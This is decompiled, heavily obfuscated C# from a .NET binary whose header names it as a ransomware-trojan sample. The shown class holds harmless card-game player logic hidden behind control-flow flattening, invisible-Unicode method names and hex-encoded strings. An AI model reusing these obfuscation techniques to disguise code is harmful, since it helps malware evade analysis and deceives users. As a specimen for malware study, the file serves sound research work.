// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: VersioningHelp, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: A8C08E3E-24A1-4DAA-9E0F-F1F4BE4809FB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-1861855b22d693257e4e3463667e53ae08711a684747fdd32f49c3e7b9c7f04f.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -284827690;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -776829481)) % 13U)
        {
          case 1:
            num1 = (int) num2 * -400624988 ^ -1971050484;
            continue;
          case 2:
            int num3;
            num1 = num3 = BaseStream != 1 ? -802414472 : (num3 = -619498761);
            continue;
          case 3:
            str2 = str1;
            num1 = -76398581;
            continue;
          case 4:
            int num4 = BaseStream == 0 ? 1880636707 : (num4 = 114688074);
            num1 = num4 ^ (int) num2 * 1412153467;
            continue;
          case 5:
            str1 = (string) null;
            num1 = (int) num2 * 1134254849 ^ -1010073388;
            continue;
          case 6:
            str1 = "4466494A4430416F";
            num1 = (int) num2 * 265596016 ^ 1370333053;
            continue;
          case 7:
            num1 = (int) num2 * 939817267 ^ 392934710;
            continue;
          case 8:
            num1 = (int) num2 * 1029281911 ^ 399754114;
            continue;
          case 9:
            num1 = (int) num2 * -1731119537 ^ 584538658;
            continue;
          case 10:
            goto label_1;
          case 11:
            num1 = (int) num2 * -1326844295 ^ 1861504138;
            continue;
          case 12:
            str1 = "5374617469634172726179496E69745479706553697A653430";
            num1 = (int) num2 * 676617680 ^ 1528213234;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = -1215124494;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -984952496)) % 4U)
        {
          case 1:
            num1 = (int) num2 * -38243908 ^ 1961707824;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      int num3 = 0;
      goto label_5;
label_7:
      int num4;
      return num4;
label_4:
      num3 = this.PlanningCards[cardTypeIndex];
label_5:
      num4 = num3;
      num1 = -363703479;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = -1646754931;
        int index;
        int num3;
        bool flag;
        int[] planningCards;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ -238386936)) % 15U)
          {
            case 0:
              num2 = -917066768;
              continue;
            case 1:
              flag = num3 > 0;
              num2 = (int) num4 * 1096784459 ^ -209669276;
              continue;
            case 2:
              int num5 = !flag ? -529543504 : (num5 = -395583642);
              num2 = num5 ^ (int) num4 * -308772419;
              continue;
            case 3:
              num2 = (int) num4 * 757705617 ^ -566415545;
              continue;
            case 4:
              planningCardsCount = num1;
              num2 = (int) num4 * -2004160550 ^ 1374890203;
              continue;
            case 5:
              goto label_1;
            case 6:
              planningCards = this.PlanningCards;
              num2 = (int) num4 * 1548664371 ^ -1115464158;
              continue;
            case 7:
              ++index;
              num2 = (int) num4 * 356031453 ^ -563190381;
              continue;
            case 8:
              num3 = planningCards[index];
              num2 = -1456014693;
              continue;
            case 9:
              num2 = (int) num4 * 1120788415 ^ 280532412;
              continue;
            case 10:
              num2 = (int) num4 * -481308661 ^ -1165638836;
              continue;
            case 11:
              int num6;
              num2 = num6 = index >= planningCards.Length ? -1758802628 : (num6 = -764956118);
              continue;
            case 12:
              ++num1;
              num2 = (int) num4 * -592432564 ^ -1447128733;
              continue;
            case 13:
              index = 0;
              num2 = (int) num4 * 1581424264 ^ -637474260;
              continue;
            default:
              goto label_16;
          }
        }
label_16:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = 300688117;
      bool flag1;
      int index;
      string str1;
      string str2;
      bool flag2;
      int planningCard;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 526373353)) % 16U)
        {
          case 0:
            str1 = Player.\u200E‍‫⁬‍‎‭‍⁪‮⁭‌‌‫⁮⁬‎‭⁯‪⁬‏‬‍⁭‬‌‭‍⁫‪​‏‪⁪‌⁪⁫‎⁪‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 1476638256;
            continue;
          case 1:
            num1 = (int) num2 * 669690274 ^ -392733550;
            continue;
          case 2:
            goto label_1;
          case 3:
            int num3 = !flag1 ? 1421201475 : (num3 = 280042818);
            num1 = num3 ^ (int) num2 * 1668812718;
            continue;
          case 4:
            str2 = str1;
            num1 = (int) num2 * 219492559 ^ 127697791;
            continue;
          case 5:
            index = 0;
            num1 = (int) num2 * -1418067496 ^ -1872747914;
            continue;
          case 7:
            num1 = (int) num2 * -1563374156 ^ -1084866802;
            continue;
          case 8:
            num1 = 1441373495;
            continue;
          case 9:
            ++index;
            num1 = 570912610;
            continue;
          case 10:
            num1 = (int) num2 * -1002692640 ^ -545532625;
            continue;
          case 11:
            flag2 = index < this.PlanningCards.Length;
            num1 = 293759302;
            continue;
          case 12:
            str1 = " ";
            num1 = (int) num2 * -1727297882 ^ -2054349052;
            continue;
          case 13:
            flag1 = planningCard == 0;
            num1 = (int) num2 * 1833326187 ^ 788475189;
            continue;
          case 14:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * 1363490357 ^ -1964178606;
            continue;
          case 15:
            int num4 = flag2 ? -929240877 : (num4 = -923878401);
            num1 = num4 ^ (int) num2 * -1654855506;
            continue;
          default:
            goto label_17;
        }
      }
label_17:
      return str2;
    }

    public static Player Deserialize(JSONNode json) => new Player()
    {
      Name = json["name"].Value,
      PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
      UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
    };

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
label_1:
      int num1 = 1827621478;
      int aIndex;
      int[] numArray;
      bool flag;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1172706602)) % 11U)
        {
          case 0:
            planningCards = numArray;
            num1 = (int) num2 * 1288205393 ^ -1302807914;
            continue;
          case 1:
            flag = aIndex < count;
            num1 = 548828104;
            continue;
          case 2:
            aIndex = 0;
            num1 = (int) num2 * -530295781 ^ 1760154485;
            continue;
          case 3:
            num1 = (int) num2 * 1818974263 ^ -725373028;
            continue;
          case 4:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = 1450407115;
            continue;
          case 5:
            ++aIndex;
            num1 = (int) num2 * -954150712 ^ -414451424;
            continue;
          case 6:
            num1 = (int) num2 * 2005637618 ^ 24741350;
            continue;
          case 8:
            int num3 = !flag ? 1988255594 : (num3 = 1855315460);
            num1 = num3 ^ (int) num2 * 1664086520;
            continue;
          case 9:
            numArray = new int[count];
            num1 = (int) num2 * 1265586805 ^ 1962638070;
            continue;
          case 10:
            goto label_1;
          default:
            goto label_12;
        }
      }
label_12:
      return planningCards;
    }

    public override string ToString() => Player.\u202B‍‌‫‌​‎‪‪⁯⁫⁮‪⁭⁭​‬‫‬​⁭‏‮​‪‮⁪‪‫‍‍⁪‌‌⁮‪⁪‍⁫‎‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);

    static string \u200E‍‫⁬‍‎‭‍⁪‮⁭‌‌‫⁮⁬‎‭⁯‪⁬‏‬‍⁭‬‌‭‍⁫‪​‏‪⁪‌⁪⁫‎⁪‮([In] string[] obj0) => string.Concat(obj0);

    static string \u202B‍‌‫‌​‎‪‪⁯⁫⁮‪⁭⁭​‬‫‬​⁭‏‮​‪‮⁪‪‫‍‍⁪‌‌⁮‪⁪‍⁫‎‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
